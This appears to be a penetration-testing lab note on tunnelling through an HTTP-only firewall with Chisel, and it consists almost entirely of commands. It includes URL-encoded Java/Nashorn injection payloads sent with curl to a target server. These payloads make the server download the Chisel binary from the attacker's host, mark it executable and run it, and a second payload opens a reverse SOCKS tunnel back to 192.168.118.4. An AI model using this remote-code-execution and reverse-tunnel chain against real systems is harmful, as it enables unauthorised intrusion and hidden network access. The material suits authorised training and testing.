# HTTP tunneling

when _Deep Packet Inspection_ (DPI) solution is now terminating all outbound traffic except HTTP



Copy Chisel binary to the Apache2 server folder.:

{% code title="kali" %}
```sh
sudo cp $(which chisel) /var/www/html/
```
{% endcode %}

Start Apache2:

{% code title="kali" %}
```sh
sudo systemctl start apache2
```
{% endcode %}

Download the **chisel** binary to **/tmp/chisel** and make it executable:

`wget 192.168.118.4/chisel -O /tmp/chisel && chmod x /tmp/chisel`&#x20;



{% code title="kali" overflow="wrap" %}
```sh
curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27wget%20192.168.118.4/chisel%20-O%20/tmp/chisel%20%26%26%20chmod%20%2Bx%20/tmp/chisel%27%29.start%28%29%22%29%7D/
```
{% endcode %}

* `${new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new java.lang.ProcessBuilder().command('bash','-c','wget 192.168.118.4/chisel -O /tmp/chisel && chmod x /tmp/chisel').start()")}/`&#x20;



```
tail -f /var/log/apache2/access.log
```



```sh
chisel server --port 8080 --reverse
```



```sh
sudo tcpdump -nvvvXi tun0 tcp port 8080
```





`/tmp/chisel client 192.168.118.4:8080 R:socks > /dev/null 2>&1 &`



{% code overflow="wrap" %}
```sh
curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20192.168.118.4:8080%20R:socks%27%29.start%28%29%22%29%7D/
```
{% endcode %}

* `${new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new java.lang.ProcessBuilder().command('bash','-c','/tmp/chisel client 192.168.118.4:8080 R:socks').start()")}/`

